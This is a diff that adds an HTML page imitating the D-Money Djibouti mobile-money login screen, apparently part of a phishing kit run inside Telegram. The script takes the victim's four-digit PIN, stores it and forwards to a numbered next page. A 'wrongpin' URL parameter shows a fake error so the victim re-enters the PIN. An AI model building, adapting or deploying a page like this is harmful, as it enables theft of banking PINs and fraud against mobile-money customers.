@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>D-Money Djibouti - Connexion</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        :root { --dmoney-yellow: #ffcc00; --dmoney-dark: #111111; --bg-color: #ffffff; --text-muted: #777777; }
+        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        body { background-color: var(--bg-color); margin: 0; padding: 0; display: flex; flex-direction: column; min-height: 100vh; }
+        .header-box { width: 100%; background: var(--dmoney-dark); padding: 35px 20px 30px; color: white; text-align: center; border-bottom: 4px solid var(--dmoney-yellow); }
+        .header-title { font-size: 32px; font-weight: 800; margin: 0; }
+        .header-title .d-part { color: var(--dmoney-yellow); }
+        .sub-header-text { font-size: 14px; margin-top: 6px; font-weight: 500; color: #aaaaaa; }
+        .main-content { width: 90%; max-width: 400px; margin: 25px auto 0; text-align: center; flex-grow: 1; display: flex; flex-direction: column; align-items: center; }
+        h2 { color: #333333; font-size: 22px; margin: 10px 0 25px; font-weight: 600; }
+        .phone-display { width: 100%; border: 1.5px solid var(--dmoney-yellow); border-radius: 12px; padding: 14px 16px; display: flex; align-items: center; gap: 12px; margin-bottom: 20px; font-size: 18px; font-weight: 700; background-color: #fffdf4; }
+        .pin-label { color: var(--text-muted); margin-bottom: 16px; font-size: 14px; font-weight: 500; }
+        .pin-wrapper { position: relative; width: 100%; display: flex; justify-content: center; align-items: center; margin-bottom: 8px; }
+        .pin-input-group { display: flex; gap: 12px; }
+        .pin-box { width: 52px; height: 52px; border: 1.5px solid #d1d5db; border-radius: 12px; text-align: center; font-size: 22px; font-weight: bold; outline: none; background-color: #ffffff; }
+        .pin-box:focus { border-color: var(--dmoney-yellow); }
+        .toggle-eye { position: absolute; right: 0; cursor: pointer; font-size: 20px; color: #333333; }
+        .forgot-pin { color: var(--text-muted); font-size: 13px; text-decoration: none; margin-bottom: 25px; display: inline-block; }
+        .btn-submit { background-color: #e2e2e2; color: #ffffff; border: none; width: 100%; padding: 16px; border-radius: 10px; font-size: 16px; font-weight: 800; cursor: not-allowed; text-transform: uppercase; }
+        .btn-submit.active { background-color: var(--dmoney-yellow); color: var(--dmoney-dark); cursor: pointer; box-shadow: 0 4px 12px rgba(255, 204, 0, 0.3); }
+        .error-banner { background-color: #fde8e8; color: #e74c3c; border: 1px solid #f8b4b4; padding: 12px; border-radius: 8px; font-size: 13px; font-weight: 600; margin-bottom: 15px; width: 100%; display: none; }
+        .footer-box { width: 100%; background: var(--dmoney-dark); padding: 30px 20px 20px; color: white; text-align: center; border-top: 4px solid var(--dmoney-yellow); margin-top: auto; }
+        .terms-text { font-size: 11px; margin-top: 15px; color: #aaaaaa; }
+    </style>
+</head>
+<body>
+<div class="header-box">
+    <div class="header-title"><span class="d-part">D</span>-Money</div>
+    <div class="sub-header-text">Services Financiers Djibouti Telecom</div>
+</div>
+
+<div class="main-content">
+    <h2>Connexion</h2>
+    <div id="errorDisplay" class="error-banner"></div>
+
+    <div class="phone-display">
+        <span>🇩🇯</span>
+        <span>+253</span>
+        <span id="displayPhone">--</span>
+    </div>
+
+    <p class="pin-label">Entrez votre code PIN</p>
+    <div class="pin-wrapper">
+        <div class="pin-input-group">
+            <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
+            <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
+            <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
+            <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
+        </div>
+        <span class="toggle-eye" id="eyeIcon">👁️‍🗨️</span>
+    </div>
+
+    <a href="#" class="forgot-pin">PIN oublié ?</a>
+    <button id="loginBtn" class="btn-submit" disabled>SE CONNECTER</button>
+</div>
+
+<div class="footer-box">
+    <div class="header-title" style="font-size: 22px;"><span class="d-part">D</span>-Money</div>
+    <p class="terms-text">En vous connectant, vous acceptez les <u>Conditions Générales d'Utilisation</u></p>
+</div>
+
+<script>
+document.addEventListener("DOMContentLoaded", () => {
+    const pinBoxes = document.querySelectorAll('.pin-box');
+    const loginBtn = document.getElementById('loginBtn');
+    const eye = document.getElementById('eyeIcon');
+    const displayPhone = document.getElementById('displayPhone');
+    const errorDisplay = document.getElementById('errorDisplay');
+
+    const savedPhone = localStorage.getItem('phone') || localStorage.getItem('userPhone') || "77000000";
+    displayPhone.textContent = savedPhone;
+
+    // Check URL parameters for wrong PIN feedback
+    const urlParams = new URLSearchParams(window.location.search);
+    if (urlParams.get('error') === 'wrongpin') {
+        errorDisplay.innerText = "❌ Code PIN incorrect, veuillez réessayer.";
+        errorDisplay.style.display = "block";
+    }
+
+    pinBoxes.forEach((box, index) => {
+        box.addEventListener('input', () => {
+            box.value = box.value.replace(/\D/g, '');
+            if (box.value && index < pinBoxes.length - 1) pinBoxes[index + 1].focus();
+            checkInputs();
+        });
+        box.addEventListener('keydown', (e) => {
+            if (e.key === "Backspace" && !box.value && index > 0) pinBoxes[index - 1].focus();
+        });
+    });
+
+    function checkInputs() {
+        const filled = [...pinBoxes].every(b => b.value.length === 1);
+        loginBtn.disabled = !filled;
+        loginBtn.classList.toggle('active', filled);
+    }
+
+    eye.addEventListener('click', () => {
+        const isPassword = pinBoxes[0].type === "password";
+        pinBoxes.forEach(b => b.type = isPassword ? "text" : "password");
+    });
+
+    loginBtn.addEventListener('click', () => {
+        if (!loginBtn.classList.contains('active')) return;
+        loginBtn.disabled = true;
+        loginBtn.classList.remove('active');
+
+        let pin = "";
+        pinBoxes.forEach(b => pin += b.value);
+        localStorage.setItem('lastPin', pin);
+
+        window.location.href = "/page7";
+    });
+
+    if (window.Telegram?.WebApp) { window.Telegram.WebApp.ready(); window.Telegram.WebApp.expand(); }
+});
+</script>
+</body>
+</html>
